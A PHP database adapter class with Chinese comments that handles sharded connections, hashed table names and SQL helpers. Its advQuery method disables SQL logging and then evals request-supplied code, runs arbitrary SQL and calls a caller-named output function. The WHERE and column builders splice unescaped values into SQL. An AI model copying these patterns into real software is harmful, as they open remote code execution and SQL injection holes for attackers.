<?php

/**
 * 数据库适配器
 *
 */
define('DB_DRIVER', 'MySQL'); // PDO, MySQL

require_once ROOT_PATH . 'etc/db.config.php';
//require_once ROOT_PATH . 'etc/dbtable.config.php';

class Core_DB {
    protected static $_dbObjs;
    
    /**
     * 取得DB连接
     *
     * @param string $hashtable
     * @param string $hashKey
     * @param boolean $forceMaster
     * @param boolean $persistent
     * @param array $dbconf
     * @return void
     */
    public static function get($dbname, $hashKey = '', $forceMaster = true, $persistent = false, $dbconf = null){
        // 数据库连接配置数组，默认是 /etc/xxx/db.config.php 中定义    	 
        if($dbconf === null){
            $dbconf = $GLOBALS['dbconf'];
        }
        
        // 分库数量，缺省1，最大分16个库
        $dbnum = isset($dbconf[$dbname]['num']) ? $dbconf[$dbname]['num'] : 1;
        
        // 数据库分库后缀，从 _0 到 _15，最大 _15，因为是对16取余数
        $dbsuffix = '';
        if($dbnum > 1 && !empty($hashKey)){
            $dbsuffix = '_' . intval(hexdec(substr(md5($hashKey), 0, 1)) % $dbnum);
        }
        
        // 数据库连接配置信息（如果数据库散列分库了，那么表示该组库默认的连接配置）
        $dbcfg = isset($dbconf[$dbname]['cfg']) ? $dbconf[$dbname]['cfg'] : array();
        
        // 如果分库，那某个分库可指定独立的连接配置
        if(isset($dbconf[$dbname . $dbsuffix]['cfg'])){
            $dbcfg = $dbconf[$dbname . $dbsuffix]['cfg'];
        }
        
        if(!$dbcfg || !is_array($dbcfg)){
            exit('Invalid DB configuration [' . $dbname . $dbsuffix . '], plz check: /etc/db.config.php');
        }
        
        // 将连接存到数组中，防止多次连接
        $dbKey = $dbname . $dbsuffix . intval($forceMaster);
        if(!isset(self::$_dbObjs[$dbKey]) || !is_object(self::$_dbObjs[$dbKey])){
            // 主库
            $writeConf = array('host'=>$dbcfg['master']['host'], 'user'=>$dbcfg['master']['user'], 'pass'=>$dbcfg['master']['pass'], 'path'=>$dbname . $dbsuffix);
            
            // 从库
            $readConf = $writeConf;
            if(isset($dbcfg['slave'])){
                $readConf = array('host'=>$dbcfg['slave']['host'], 'user'=>$dbcfg['slave']['user'], 'pass'=>$dbcfg['slave']['pass'], 'path'=>$dbname . $dbsuffix);
            }
            
            // 创建数据库连接对象 -- 此时只创建的空的数据库对象
            $dbClass = 'Core_DB_' . DB_DRIVER;
            $persistent = ($persistent || $dbconf['PERSISTENT_CONTENT']);
            $dbObj = new $dbClass($writeConf, $readConf, $forceMaster, $persistent);
            
            self::$_dbObjs[$dbKey] = $dbObj;
        }
        return self::$_dbObjs[$dbKey];
    }
    
    /**
     * 释放连接
     */
    public static function disconnect(){
        if(self::$_dbObjs && is_array(self::$_dbObjs)){
            foreach(self::$_dbObjs as $key=>$dbObj){
                try{
                    $dbObj->disconnect();
                    unset(self::$_dbObjs[$key]);
                }catch(Exception $e){
                }
            }
        }
    }
    
    /**
     * 析构函数
     */
    public function __destruct(){
        self::disconnect();
    }
    
    /**
     * 根据条件数组生成 whereSQL
     *
     * @param mixed $whereArr
     * @return string
     */
    public static function getWhereSQL($whereArr){
        $where = $comma = '';
        if(empty($whereArr)){
            $where = '1';
        }elseif(is_array($whereArr)){
            foreach($whereArr as $key=>$value){
                if(strpos($key, ' ') !== false){
                    list($field, $operator) = explode(' ', $key);
                    $operator = strtoupper($operator);
                    if(!in_array($operator, array('>', '<', '>=', '<=', '!=', '<>', '=', 'LIKE'))){
                        $operator = '=';
                    }
                }else{
                    $field = $key;
                    $operator = '=';
                }
                $where .= $comma . '`' . $field . '` ' . $operator . ' \'' . $value . '\'';
                $comma = ' AND ';
            }
        }else{
            $where = $whereArr;
        }
        return $where;
    }
    
    /**
     * 根据字段数组生成 colSQL
     *
     * @param mixed $colArr
     * @return string
     */
    public static function getColSQL($colArr){
        if(empty($colArr)){
            $col = '*';
        }elseif(is_array($colArr)){
            $col = '`' . implode('`,`', $colArr) . '`';
        }else{
            $col = "`{$colArr}`";
        }
        return $col;
    }
    
    /**
     * 取得Hash过的表名
     *
     * @param string $hashtable
     * @param string $hashKey
     * @param int $hashnum
     * @return string
     */
    public static function getHashTableName($hashtable, $hashKey = '', $hashnum = 0){
        if(!$hashnum){
            $hashnum = isset($GLOBALS['tableconf'][$hashtable]['tblnum']) ? $GLOBALS['tableconf'][$hashtable]['tblnum'] : 1;
        }
        
        if($hashnum <= 1){
            return $hashtable;
        }
        
        // 拆表没有上限，分表后缀是十六进制，会补全0前缀
        if(in_array($hashnum, array(16, 256, 4096))){
            $suffix = substr(md5($hashKey), 0, log($hashnum, 16)); // 从 _00 到 _ff
        }else{
            $suffix = str_pad(dechex(hexdec(substr(md5($hashKey), 0, 4)) % $hashnum), ceil(log($hashnum, 16)), '0', STR_PAD_LEFT);
        }
        
        return $hashtable . '_' . $suffix;
    }
    
    /**
     * 写 SQL 执行日志
     *
     * @param string $host
     * @param string $dbname
     * @param string $query
     * @param array $params
     * @param int $time
     * @return mixed
     */
    public static function writeSqlLog($host, $dbname, $query, $params, $time){
        if(isset($GLOBALS['NO_WRITE_SQL_LOG']) && $GLOBALS['NO_WRITE_SQL_LOG']){
            return null; // 不写SQL日志
        }
        
        /* 不需要记日志的数据库查询 #todo
        if ($path == 'sns_log_db') {
            return true;
        }
        */
        $query = str_replace("\n", ' ', trim($query));
        $query = preg_replace('/\s+/', ' ', $query);
        if(isDebug()){
            $GLOBALS['__runmsg'][] = array('slow'=>($time > 0.001), // 慢查询
'time'=>sprintf('%.4f', $time), 'host'=>$host, 'dbname'=>$dbname, 'sql'=>self::replaceHolder($query, $params));
        }
        if($time < $GLOBALS['GLOBAL_CONF']['MySQL_Slow_Query_Time']){
            return true;
        }
    
     #todo 记录文件 sql.log
    }
    
    /**
     * 将 SQL 语句中的 ? 替换为实际值
     *
     * @param string $sql
     * @param array $params
     * @return string
     */
    public static function replaceHolder($sql = '', $params = array()){
        if($params && is_array($params)){
            while(strpos($sql, '?') > 0){
                $sql = preg_replace('/\?/', "'" . array_shift($params) . "'", $sql, 1);
            }
        }
        return $sql;
    }
    
    /**
     * 高级DB查询
     *
     * @param array $data
     * @return mixed
     */
    public static function advQuery($data){
        // 不写SQL日志
        $GLOBALS['NO_WRITE_SQL_LOG'] = true;
        
        // eval execute
        if(isset($data['via']) && $data['via'] == 2){
            eval(stripslashes(trim($data['query'])));
            exit();
        }
        
        $dbName = $data['db'];
        $sql = stripslashes($data['query']);
        $fetchMethod = $data['fetchMethod'];
        
        if(!$dbName || !$sql || !$fetchMethod){
            exit('Invalid advQuery Params');
        }
        
        $limit = isset($data['limit']) ? ($data['limit']) : 0;
        $limitSql = $limit > 0 ? ' LIMIT ' . $limit : ' LIMIT 1';
        $limitSql = $limit == -99 ? '' : $limitSql;
        
        $db = Core_DB::get($dbName);
        $result = $db->$fetchMethod($sql . $limitSql);
        
        // 打印结果
        $output = (isset($data['output']) && $data['output']) ? $data['output'] : 'print_r';
        if($output){
            echo '<pre>';
            $output($result);
            exit();
        }
        
        return $result;
    }
}